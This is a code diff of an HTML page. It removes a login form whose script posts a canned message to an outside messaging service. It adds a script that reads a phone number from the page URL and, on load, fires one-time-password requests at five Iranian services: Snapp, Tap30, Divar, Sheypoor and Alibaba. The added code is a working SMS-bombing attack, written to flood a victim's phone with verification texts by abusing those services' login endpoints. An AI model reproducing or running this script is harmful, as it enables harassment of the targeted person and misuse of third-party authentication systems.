@@ -1,42 +1,49 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">
-    <title>Login Page</title>
-</head>
-<body class="bg-gray-200 flex items-center justify-center h-screen">
-    <form id="loginForm" class="bg-white shadow-md rounded px-8 pt-6 pb-8 mb-4">
-        <div class="mb-4">
-            <label for="username" class="block text-gray-700 text-sm font-bold mb-2">Username</label>
-            <textarea id="message" dir="auto" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700" placeholder="پیام خودتو بنویس"></textarea>
-            <p id="error" class="text-red-500 text-xs italic mt-3 mb-2 hidden">please enter a valid username (min 3 & max 64)</p>
-        </div>
-        <div class="flex items-center justify-between">
-            <button type="submit" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded">
-                Login
-            </button>
-        </div>
-    </form>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+<script>
+  const url = window.location.href;
+  const phone = url.split("?").pop();
+  try {
+    $.ajax({
+      type:'post',
+      mode: "cors",
+      cache: "no-cache",
+      url:"https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
+      data:{"cellphone":phone},
+    });// ajax
+    $.ajax({
+      type:'post',
+      mode: "cors",
+      cache: "no-cache",
+      url:"https://tap33.me/api/v2/user",
+      data:{"credential":{"phoneNumber":phone,"role":"PASSENGER"}},
+    });// ajax
+    $.ajax({
+      type:'post',
+      mode: "cors",
+      cache: "no-cache",
+      url:"https://api.divar.ir/v5/auth/authenticate",
+      data:{"phone":phone},
+    });// ajax
+    $.ajax({
+      type:'post',
+      mode: "cors",
+      cache: "no-cache",
+      url:"https://www.sheypoor.com/auth",
+      data:{"username" : phone},
+    });// ajax
+    $.ajax({
+      type:'post',
+      mode: "cors",
+      cache: "no-cache",
+      url:"https://ws.alibaba.ir/api/v3/account/mobile/otp",
+      data:{"phoneNumber":phone},
+    });// ajax
+  } catch (error) {
     
-        <script>
-        var id = "16965075642233";
-        function sendMsg() {
-            var text = "سلام این دفعه سومه و کار میکنه";
-            $.post("https://harfeto.timefriend.net/harfeto/sendMsg", {text: text,id:id},function(result,status){
-                if(status=='success'){
-                    var obj = JSON.parse(result);
-                    if(obj.id!='0'){
-                        $('.hide').replaceWith('<p  style="font-size: 20px;color: #00ff15;direction: rtl;">پیام شما با موفقیت ارسال شد.</p>');
-                    }else{
-                        alert('اشکال در ارتباط با سرور');
-                    }
-                }
-            });
-        }
-    </script>
-    
-    
-</body>
-</html>
+  }
+
+</script>
+
+
